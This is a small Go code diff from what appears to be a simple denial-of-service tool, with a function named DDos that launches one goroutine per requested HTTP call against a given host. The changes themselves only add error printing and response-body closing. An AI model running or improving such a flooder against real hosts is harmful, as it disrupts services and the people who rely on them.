@@ -63,19 +63,19 @@ func recoverConnection() {
 
 func verifyError(err error, statusCode int) {
 	if statusCode != 200 {
+		fmt.Println(err)
 		fmt.Println("status-code", statusCode)
-		
+
 	}
 }
 
 func DDos(host string, requests string) {
 
-
 	r, err := strconv.ParseInt(requests, 10, 64)
 	if err != nil {
 		log.Fatal(err)
 	}
-	
+
 	for i := 0; int64(i) < r; i++ {
 		fmt.Println(i)
 		go workerRequest(host)
@@ -102,5 +102,6 @@ func workerRequest(host string) {
 	res, err := client.Do(req)
 	verifyError(err, res.StatusCode)
 
+	defer res.Body.Close()
 	defer recoverConnection()
 }
